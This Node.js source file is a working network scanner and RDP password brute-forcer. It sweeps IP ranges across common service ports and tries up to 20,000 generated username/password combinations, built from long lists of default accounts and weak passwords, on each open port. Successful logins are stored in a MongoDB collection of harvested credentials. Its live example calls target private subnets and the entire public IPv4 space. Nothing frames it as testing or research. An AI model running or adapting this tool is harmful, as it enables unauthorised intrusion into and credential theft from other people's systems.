const fs = require('fs');
const net = require('net');
const RDPClient = require('node-rdpjs').RDPClient;
const { MongoClient } = require('mongodb');
require('dotenv').config(); // Load environment variables

// MongoDB Connection URI
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'credgenerator'; // Still hardcoded, consider moving to .env if it changes
const COLLECTION_NAME = 'successful_rdp_logins'; // Still hardcoded, consider moving to .env if it changes

// Characters for password complexity
const numbers = '0123456789';
const specialChars = '!@#$%^&*()_+[]{}|;:,.<>?';

const commonUsernames = [
    'admin', 'user', 'test', 'administrator', 'guest', 'root',
    'support', 'info', 'operator', 'sysadmin', 'webmaster',
    'dev', 'developer', 'ftpuser', 'backup', 'security', 'monitor',
    'Admin', 'User', 'Test', 'Administrator', 'Guest', 'Root',
    'Support', 'Info', 'Operator', 'Sysadmin', 'Webmaster',
    'Developer', 'Ftpuser', 'Backup', 'Security', 'Monitor',
    'admin01', 'user01', 'test01', 'admin1', 'user1', 'test1',
    'service', 'svc_account', 'localadmin', 'remoteuser', 'rdpuser',
    'john.doe', 'jane.smith', 'jdoe', 'jsmith', 'accounting', 'sales',
    'marketing', 'hr', 'itadmin', 'networkadmin', 'dbadmin', 'sqladmin',
    'postmaster', 'helpdesk', 'tech', 'engineer', 'auditor', 'manager',
    'supervisor', 'director', 'ceo', 'cfo', 'cio', 'cto', 'president',
    'secretary', 'assistant', 'intern', 'trainee', 'student', 'teacher',
    'professor', 'doctor', 'nurse', 'patient', 'client', 'customer',
    'vendor', 'partner', 'contractor', 'consultant', 'guestuser', 'temp',
    'tempuser', 'defaultuser', 'public', 'anonymous', 'system', 'daemon',
    'www-data', 'apache', 'nginx', 'mysql', 'postgres', 'oracle', 'mssql',
    'jenkins', 'gitlab', 'jira', 'confluence', 'redmine', 'nagios',
    'zabbix', 'splunk', 'elk', 'kibana', 'grafana', 'prometheus',
    'ansible', 'puppet', 'chef', 'saltstack', 'docker', 'kubernetes',
    'azureuser', 'ec2-user', 'ubuntu', 'centos', 'debian', 'fedora',
    'kali', 'pi', 'admin_user', 'superadmin', 'poweruser', 'restricteduser',
    'guest_account', 'shareduser', 'domainadmin', 'enterpriseadmin',
    'network_user', 'serveradmin', 'workstation', 'desktop', 'laptop',
    'mobile', 'tablet', 'iotdevice', 'camera', 'printer', 'scanner',
    'router', 'switch', 'firewall', 'vpnuser', 'vpnadmin', 'proxyuser',
    'proxyadmin', 'webuser', 'appuser', 'apiuser', 'batchuser', 'scheduler',
    'monitoruser', 'loguser', 'reportuser', 'testaccount', 'devaccount',
    'qaaccount', 'prodaccount', 'stagingaccount', 'demoaccount', 'training',
    'traininguser', 'education', 'research', 'labuser', 'studentuser',
    'faculty', 'staff', 'alumni', 'member', 'subscriber', 'contributor',
    'editor', 'publisher', 'moderator', 'reviewer', 'approver', 'requester',
    'applicant', 'candidate', 'employee', 'hruser', 'payroll', 'finance',
    'salesuser', 'marketinguser', 'supportuser', 'ithelpdesk', 'securityuser',
    'auditoruser', 'compliance', 'legal', 'executive', 'boardmember',
    'shareholder', 'investor', 'founder', 'owner', 'proprietor', 'manageruser',
    'supervisoruser', 'directoruser', 'ceo_user', 'cfo_user', 'cio_user',
    'cto_user', 'president_user', 'secretary_user', 'assistant_user',
    'intern_user', 'trainee_user', 'student_user', 'teacher_user',
    'professor_user', 'doctor_user', 'nurse_user', 'patient_user',
    'client_user', 'customer_user', 'vendor_user', 'partner_user',
    'contractor_user', 'consultant_user', 'guest_user', 'temp_user',
    'default_user', 'public_user', 'anonymous_user', 'system_user',
    'daemon_user', 'www_data_user', 'apache_user', 'nginx_user',
    'mysql_user', 'postgres_user', 'oracle_user', 'mssql_user',
    'jenkins_user', 'gitlab_user', 'jira_user', 'confluence_user',
    'redmine_user', 'nagios_user', 'zabbix_user', 'splunk_user',
    'elk_user', 'kibana_user', 'grafana_user', 'prometheus_user',
    'ansible_user', 'puppet_user', 'chef_user', 'saltstack_user',
    'docker_user', 'kubernetes_user', 'azure_user', 'ec2_user',
    'ubuntu_user', 'centos_user', 'debian_user', 'fedora_user',
    'kali_user', 'pi_user', 'admin_account', 'super_admin', 'power_user',
    'restricted_account', 'guest_login', 'shared_account', 'domain_admin',
    'enterprise_admin', 'network_admin', 'server_admin', 'workstation_user',
    'desktop_user', 'laptop_user', 'mobile_user', 'tablet_user',
    'iot_device_user', 'camera_user', 'printer_user', 'scanner_user',
    'router_user', 'switch_user', 'firewall_user', 'vpn_user',
    'vpn_admin_user', 'proxy_user_account', 'proxy_admin_account',
    'web_user_account', 'app_user_account', 'api_user_account',
    'batch_user_account', 'scheduler_user_account', 'monitor_user_account',
    'log_user_account', 'report_user_account', 'test_account',
    'dev_account_user', 'qa_account_user', 'prod_account_user',
    'staging_account_user', 'demo_account_user', 'training_account',
    'training_user_account', 'education_user', 'research_user',
    'lab_user_account', 'student_user_account', 'faculty_user',
    'staff_user', 'alumni_user', 'member_user', 'subscriber_user',
    'contributor_user', 'editor_user', 'publisher_user', 'moderator_user',
    'reviewer_user', 'approver_user', 'requester_user', 'applicant_user',
    'candidate_user', 'employee_user', 'hr_user_account', 'payroll_user',
    'finance_user', 'sales_user', 'marketing_user_account', 'support_user_account',
    'it_helpdesk_user', 'security_user_account', 'auditor_user_account',
    'compliance_user', 'legal_user', 'executive_user', 'board_member_user',
    'shareholder_user', 'investor_user', 'founder_user', 'owner_user',
    'proprietor_user', 'manager_account', 'supervisor_account',
    'director_account', 'ceo_account', 'cfo_account', 'cio_account',
    'cto_account', 'president_account', 'secretary_account',
    'assistant_account', 'intern_account', 'trainee_account',
    'student_account', 'teacher_account', 'professor_account',
    'doctor_account', 'nurse_account', 'patient_account', 'client_account',
    'customer_account', 'vendor_account', 'partner_account',
    'contractor_account', 'consultant_account'
];
const commonPasswordBases = [
    'password', '123456', 'qwerty', 'admin', 'user', 'test', 'welcome', 'changeit',
    '12345678', 'access', 'guest', 'secret', 'company', 'default',
    'p@ssword', 'admin123', 'user123', 'root123', 'changeme',
    'Password', 'Welcome1', 'ChangeIt!', 'Secret123', 'Company2024',
    'Admin@123', 'User@123', 'Test@123', 'Root@123', 'Default@123',
    'password123', '123456789', 'qwerty123', 'adminadmin', 'useruser',
    '1234567890', 'password!', 'P@ssw0rd', 'Welcome!', 'ChangeMe!',
    'MyPassword', 'Secure123', 'Admin@dmin', 'User@User', 'Test@Test',
    'Company@123', 'Default@P@ss', 'P@ssword1', 'P@ssword2', 'P@ssword3',
    'Summer2024', 'Winter2024', 'Spring2024', 'Fall2024', 'Holiday2024',
    'Q12024', 'Q22024', 'Q32024', 'Q42024', 'Fiscal2024', 'Project2024',
    'Network@1', 'Server@1', 'Database@1', 'Web@1', 'App@1', 'System@1',
    'ITSupport', 'HelpDesk', 'TechAdmin', 'Engineer1', 'Auditor@1',
    'Manager@1', 'Supervisor@1', 'Director@1', 'Executive@1',
    'CEO@1', 'CFO@1', 'CIO@1', 'CTO@1', 'President@1',
    'Secretary@1', 'Assistant@1', 'Intern@1', 'Trainee@1',
    'Student@1', 'Teacher@1', 'Professor@1', 'Doctor@1', 'Nurse@1',
    'Patient@1', 'Client@1', 'Customer@1', 'Vendor@1', 'Partner@1',
    'Contractor@1', 'Consultant@1', 'Guest@1', 'Temp@1', 'Default@1',
    'Public@1', 'Anonymous@1', 'System@1', 'Daemon@1', 'WWWData@1',
    'Apache@1', 'Nginx@1', 'MySQL@1', 'Postgres@1', 'Oracle@1',
    'MSSQL@1', 'Jenkins@1', 'Gitlab@1', 'Jira@1', 'Confluence@1',
    'Redmine@1', 'Nagios@1', 'Zabbix@1', 'Splunk@1', 'ELK@1',
    'Kibana@1', 'Grafana@1', 'Prometheus@1', 'Ansible@1', 'Puppet@1',
    'Chef@1', 'Saltstack@1', 'Docker@1', 'Kubernetes@1', 'Azure@1',
    'EC2@1', 'Ubuntu@1', 'Centos@1', 'Debian@1', 'Fedora@1',
    'Kali@1', 'Pi@1', 'AdminUser@1', 'SuperAdmin@1', 'PowerUser@1',
    'Restricted@1', 'GuestAccount@1', 'SharedUser@1', 'DomainAdmin@1',
    'EnterpriseAdmin@1', 'NetworkUser@1', 'ServerAdmin@1',
    'Workstation@1', 'Desktop@1', 'Laptop@1', 'Mobile@1', 'Tablet@1',
    'IoTDevice@1', 'Camera@1', 'Printer@1', 'Scanner@1', 'Router@1',
    'Switch@1', 'Firewall@1', 'VPNUser@1', 'VPNAdmin@1', 'ProxyUser@1',
    'ProxyAdmin@1', 'WebUser@1', 'AppUser@1', 'APIUser@1', 'BatchUser@1',
    'Scheduler@1', 'MonitorUser@1', 'LogUser@1', 'ReportUser@1',
    'TestAccount@1', 'DevAccount@1', 'QAAccount@1', 'ProdAccount@1',
    'StagingAccount@1', 'DemoAccount@1', 'Training@1', 'TrainingUser@1',
    'Education@1', 'Research@1', 'LabUser@1', 'StudentUser@1',
    'Faculty@1', 'Staff@1', 'Alumni@1', 'Member@1', 'Subscriber@1',
    'Contributor@1', 'Editor@1', 'Publisher@1', 'Moderator@1',
    'Reviewer@1', 'Approver@1', 'Requester@1', 'Applicant@1',
    'Candidate@1', 'Employee@1', 'HRUser@1', 'Payroll@1', 'Finance@1',
    'SalesUser@1', 'MarketingUser@1', 'SupportUser@1', 'ITHelpdesk@1',
    'SecurityUser@1', 'AuditorUser@1', 'Compliance@1', 'Legal@1',
    'Executive@1', 'BoardMember@1', 'Shareholder@1', 'Investor@1',
    'Founder@1', 'Owner@1', 'Proprietor@1', 'ManagerAccount@1',
    'SupervisorAccount@1', 'DirectorAccount@1', 'CEOAccount@1',
    'CFOAccount@1', 'CIOAccount@1', 'CTOAccount@1', 'PresidentAccount@1',
    'SecretaryAccount@1', 'AssistantAccount@1', 'InternAccount@1',
    'TraineeAccount@1', 'StudentAccount@1', 'TeacherAccount@1',
    'ProfessorAccount@1', 'DoctorAccount@1', 'NurseAccount@1',
    'PatientAccount@1', 'ClientAccount@1', 'CustomerAccount@1',
    'VendorAccount@1', 'PartnerAccount@1', 'ContractorAccount@1',
    'ConsultantAccount@1'
];

function getRandomChar(charSet) {
    return charSet[Math.floor(Math.random() * charSet.length)];
}

function generateSingleCredential(includeNumbers = true, includeSpecialChars = true) {
    const usernameBase = commonUsernames[Math.floor(Math.random() * commonUsernames.length)];
    let password = commonPasswordBases[Math.floor(Math.random() * commonPasswordBases.length)];

    // Randomly add numbers
    if (includeNumbers) {
        const numNumbersToAdd = Math.floor(Math.random() * 3); // 0 to 2 numbers
        for (let i = 0; i < numNumbersToAdd; i++) {
            const randomIndex = Math.floor(Math.random() * (password.length + 1));
            password = password.slice(0, randomIndex) + getRandomChar(numbers) + password.slice(randomIndex);
        }
    }

    // Randomly add special characters
    if (includeSpecialChars) {
        const numSpecialCharsToAdd = Math.floor(Math.random() * 2); // 0 to 1 special characters
        for (let i = 0; i < numSpecialCharsToAdd; i++) {
            const randomIndex = Math.floor(Math.random() * (password.length + 1));
            password = password.slice(0, randomIndex) + getRandomChar(specialChars) + password.slice(randomIndex);
        }
    }

    // Add some variations like appending numbers to usernames
    if (Math.random() < 0.3) { // 30% chance to append a number to username
        const numSuffix = Math.floor(Math.random() * 10); // 0-9
        return { username: usernameBase + numSuffix, password: password };
    }

    return { username: usernameBase, password: password };
}

// Function to convert IP address to a long integer
function ipToLong(ip) {
    return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
}

// Function to convert a long integer back to an IP address
function longToIp(long) {
    return [(long >>> 24), (long >>> 16 & 255), (long >>> 8 & 255), (long & 255)].join('.');
}

// Function to check if a port is open
function checkPort(ip, port, timeout = 1000) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(timeout);

        socket.on('connect', () => {
            socket.destroy();
            resolve(true);
        });

        socket.on('timeout', () => {
            socket.destroy();
            resolve(false);
        });

        socket.on('error', () => {
            socket.destroy();
            resolve(false);
        });

        socket.connect(port, ip);
    });
}

// Function to attempt RDP login
async function attemptRDPLogin(ip, port, maxAttempts = 20000) { // Added maxAttempts parameter
    console.log(`\nAttempting RDP login on ${ip}:${port} with up to ${maxAttempts} dynamic credentials...`);
    for (let i = 0; i < maxAttempts; i++) {
        const cred = generateSingleCredential(); // Generate a single credential dynamically
    console.log(`Trying ${cred.username}:${cred.password} on ${ip}:${port} (attempt ${i + 1}/${maxAttempts})...`);
        try {
            const client = new RDPClient({
                server: ip,
                port: port,
                userName: cred.username,
                password: cred.password,
                domain: '', // You might need to specify a domain if applicable
                autoLogin: true, // Attempt to log in automatically
                screen: {
                    width: 1024,
                    height: 768
                }
            });

            const loginPromise = new Promise((resolve, reject) => {
                client.on('connect', async () => {
                    console.log(`\n[SUCCESS] RDP Login successful for ${cred.username}:${cred.password} on ${ip}:${port}`);
                    await saveSuccessfulLogin(ip, cred.username, cred.password); // Save to MongoDB
                    client.close(); // Close the connection after successful login
                    resolve(true);
                });

                client.on('error', (err) => {
                    // console.error(`\n[ERROR] RDP connection error for ${cred.username}:${cred.password} on ${ip}:${port}: ${err.message}`);
                    client.close();
                    reject(new Error(`Login failed: ${err.message}`));
                });

                client.on('close', () => {
                    // console.log(`\nConnection to ${ip}:${port} closed.`);
                    // This might fire after an error or successful connect, so handle carefully
                });

                // Set a timeout for the connection attempt
                const timeout = setTimeout(() => {
                    client.close();
                    reject(new Error('RDP connection timed out'));
                }, 5000); // 5 seconds timeout for RDP connection

                client.on('connect', () => clearTimeout(timeout));
                client.on('error', () => clearTimeout(timeout));
                client.on('close', () => clearTimeout(timeout));
            });

            await loginPromise;
            return true; // If one credential works, we can stop
        } catch (e) {
            // console.log(`Login attempt failed for ${cred.username}:${cred.password}: ${e.message}`);
            // Continue to the next credential
        }
    }
    console.log(`\nNo credentials worked for RDP on ${ip}:${port} after ${maxAttempts} attempts.`);
    return false;
}

// Function to save successful login to MongoDB
async function saveSuccessfulLogin(ip, username, password) {
    let client;
    try {
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        const db = client.db(DB_NAME);
        const collection = db.collection(COLLECTION_NAME);
        await collection.insertOne({ ip, username, password, timestamp: new Date() });
        console.log(`[MongoDB] Successfully saved RDP login for ${username}:${password} on ${ip}`);
    } catch (error) {
        console.error('[MongoDB] Error saving successful login:', error);
    } finally {
        if (client) {
            await client.close();
        }
    }
}

// --- New IP Scanning and Login Logic ---
async function runNetworkScan(startIp, endIp) { // Removed allCreds parameter
    const portsToScan = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 3389, 8080, 8443, 5900, 5985, 5986, 3306, 5432, 1433, 1521, 27017]; // Common ports: SSH, HTTP, HTTPS, RDP

    console.log(`\nStarting network scan from ${startIp} to ${endIp} for ports: ${portsToScan.join(', ')}`);

    const startLong = ipToLong(startIp);
    const endLong = ipToLong(endIp);

    const openHosts = [];

    for (let i = startLong; i <= endLong; i++) {
        const ip = longToIp(i);
        for (const port of portsToScan) {
            process.stdout.write(`Scanning ${ip}:${port}...\r`); // Visual feedback
            const isOpen = await checkPort(ip, port);
            if (isOpen) {
                console.log(`\nFound open port: ${ip}:${port}`);
                openHosts.push({ ip, port });
                console.log(`Attempting RDP login on ${ip}:${port}...`);
                await attemptRDPLogin(ip, port); // No credentials array passed
            }
        }
    }
    console.log('\nNetwork scan complete.');
    if (openHosts.length > 0) {
        console.log('Open hosts found:', openHosts);
    } else {
        console.log('No open ports found in the specified range.');
    }
}
    // Example usage:
    // To scan a /24 subnet (e.g., 192.168.1.1 to 192.168.1.254)
     runNetworkScan('192.168.1.1', '192.168.1.254').catch(console.error);

    // To scan a single IP address
     runNetworkScan('192.168.1.100', '192.168.1.100').catch(console.error);

    // To scan a wider range, e.g., a /16 subnet (this will take a very long time!)
    runNetworkScan('192.168.0.1', '192.168.255.254').catch(console.error);

    // To scan the entire IPv4 public address space (this will take an extremely long time!)
    runNetworkScan('1.0.0.0', '223.255.255.255').catch(console.error);

    // For demonstration, let's use a small range or a single IP
    runNetworkScan('127.0.0.1', '127.0.0.1').catch(console.error);

module.exports = { runNetworkScan };